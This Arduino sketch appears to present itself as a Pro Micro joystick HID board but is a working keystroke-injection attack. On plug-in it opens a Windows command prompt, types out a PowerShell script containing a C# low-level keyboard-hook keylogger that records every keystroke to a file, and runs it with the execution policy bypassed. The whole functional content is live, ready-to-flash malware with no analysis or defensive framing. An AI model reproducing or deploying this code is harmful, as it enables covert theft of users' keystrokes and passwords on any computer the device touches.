// SparkFun Pro Micro 5v/16mhz 
// Board: "SparkFun Pro Micro 5v/16mhz (Joystick HID)"
// Programmer: AVRISP MkII

const int buttonPins[] = {2, 3, 4};
const int size = sizeof(buttonPins) / sizeof(int);
const int pollRate = 100;

int buttonState = 0;
int buttonState2 = 0;
int buttonState3 = 0;
long m = millis();

//JoyState_t joyState;

void setup() {        
  for (int i = 0; i < size; i++)
    pinMode(buttonPins[i], INPUT_PULLUP);    

  m = millis();
  
  Keyboard.begin();
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  
  delay(1000);
  
  Keyboard.println("cmd.exe"); 

  delay(1000);

  Keyboard.println(F("mkdir c:\\fexhack"));  
  Keyboard.println(F("copy con \"c:\\fexhack\\x.ps1\""));
  Keyboard.println(F("Add-Type -TypeDefinition @\""));
  Keyboard.println(F("using System; using System.IO; using System.Diagnostics; using System.Runtime.InteropServices; using System.Windows.Forms;"));
  Keyboard.println(F("namespace KeyLogger {"));
  Keyboard.println(F("  public static class Program {"));
  Keyboard.println(F("    const int WH_KEYBOARD_LL = 13;"));
  Keyboard.println(F("    const int WM_KEYDOWN = 0x0100;"));
  Keyboard.println(F("    const string logFileName = @\"c:\\fexhack\\x.txt\";"));
  Keyboard.println(F("    static StreamWriter logFile;"));
  Keyboard.println(F("    static HookProc hookProc = HookCallback;"));
  Keyboard.println(F("    static IntPtr hookId = IntPtr.Zero;"));
  Keyboard.println(F("    public static void Main() {"));
  Keyboard.println(F("      logFile = File.AppendText(logFileName);"));
  Keyboard.println(F("      logFile.AutoFlush = true;"));
  Keyboard.println(F("      hookId = SetHook(hookProc);"));
  Keyboard.println(F("      Application.Run();"));
  Keyboard.println(F("      UnhookWindowsHookEx(hookId);"));
  Keyboard.println(F("    }"));
  Keyboard.println(F("    static IntPtr SetHook(HookProc hookProc) {"));
  Keyboard.println(F("      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);"));
  Keyboard.println(F("      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);"));
  Keyboard.println(F("    }"));
  Keyboard.println(F("    delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);"));
  Keyboard.println(F("    static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {"));
  Keyboard.println(F("      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {"));
  Keyboard.println(F("        int vkCode = Marshal.ReadInt32(lParam);"));
  Keyboard.println(F("        logFile.WriteLine((Keys)vkCode);"));
  Keyboard.println(F("        if ((Keys)vkCode == Keys.F12)"));
  Keyboard.println(F("		System.Diagnostics.Process.Start(\"calc\");"));
  Keyboard.println(F("      }"));
  Keyboard.println(F("      return CallNextHookEx(hookId, nCode, wParam, lParam);"));
  Keyboard.println(F("    }"));
  Keyboard.println(F("    [DllImport(\"user32.dll\")]"));
  Keyboard.println(F("    static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);"));
  Keyboard.println(F("    [DllImport(\"user32.dll\")]"));
  Keyboard.println(F("    static extern bool UnhookWindowsHookEx(IntPtr hhk);"));
  Keyboard.println(F("    [DllImport(\"user32.dll\")]"));
  Keyboard.println(F("    static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);"));
  Keyboard.println(F("    [DllImport(\"kernel32.dll\")]"));
  Keyboard.println(F("    static extern IntPtr GetModuleHandle(string lpModuleName);"));
  Keyboard.println(F("  }"));
  Keyboard.println(F("}"));
  Keyboard.println(F("\"@ -ReferencedAssemblies System.Windows.Forms"));
  Keyboard.println(F("[KeyLogger.Program]::Main();"));

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  delay(100);
  Keyboard.releaseAll();
  
  Keyboard.println();
  Keyboard.println(F("powershell -executionpolicy Bypass -File \"c:\\fexhack\\x.ps1\""));
}

void loop(){
  /*
  if (millis() - m > pollRate)
  {
    m = millis();
    
    joyState.buttons = 0;
    
    for (int i = 0; i < size; i++) {
       int state = digitalRead(buttonPins[i]); 
       if (state == LOW) 
         joyState.buttons += 1 << i;
    }
    
    Joystick.setState(&joyState);
  }
  */
}
